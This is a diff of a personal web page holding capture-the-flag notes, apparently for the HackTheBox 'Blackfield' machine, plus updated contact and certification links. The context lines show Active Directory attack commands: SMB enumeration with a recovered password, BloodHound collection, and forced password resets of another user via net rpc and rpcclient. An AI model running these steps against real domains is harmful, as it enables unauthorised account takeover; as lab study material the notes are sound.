@@ -2057,7 +2057,7 @@
                         <br>`crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'` `smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'` can READ: IPC$ NETLOGON profiles$ SYSVOL
                         <br>`bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip`
                         <br>bloodhound GUI search 'support', the user has 1 'First Degree Object Control' which is 'ForceChangePassword' on user 'AUDIT2020'
-                        <br>Linux example: `net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
+                        <br>Linux example: `net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"` [if Password has ! it need to be \!]
                         <br>0xdf use: `rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'`
                         <br>Note: '23' is from https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN
                         <br>Failed: `crackmapexec winrm 10.10.10.192 -u audit2020 -p '0xdf!!!'`
@@ -4194,11 +4194,14 @@
             </div>
         </div>
         <!-- ========================pico_ctf_content======================== -->
-        <br><span>Currently,I'm working on OSCP exam</span>
+        <br><span>Grind Cyber Certificates</span>
+        <br><span><a href="https://flowgpt.com/p/guidingbooks" target="_blank">What's_our_purpose_on_this_planet?</a></span>
         <br><span>==========Contact==========</span>
         <br><span id="protectedEmail"></span>
-        <br><span><a href="https://www.linkedin.com/in/joe912693295" target="_blank">My LinkedIn Profile</a></span>
+        <br><span><a href="https://www.linkedin.com/in/joe912693295" target="_blank">[Linkedin] </a></span>
+        <span><a href="https://discordapp.com/users/576756138637262869" target="_blank">[Discord] </a></span>        
         <br><span>==========Certifications==========</span>
+        <br><a href="images/doc/Certified in Cybersecurity.pdf" target="_blank">Certified in Cybersecurity.pdf</a>
         <br><a href="images/doc/Cisco Certified Internetwork Expert(Security).pdf" target="_blank">Cisco Certified Internetwork Expert(Security).pdf</a>
         <br><a href="images/doc/Cisco Certified Network Professional(Enterprise).pdf" target="_blank">Cisco Certified Network Professional(Enterprise).pdf</a>
         <br><span>==========Documents==========</span>
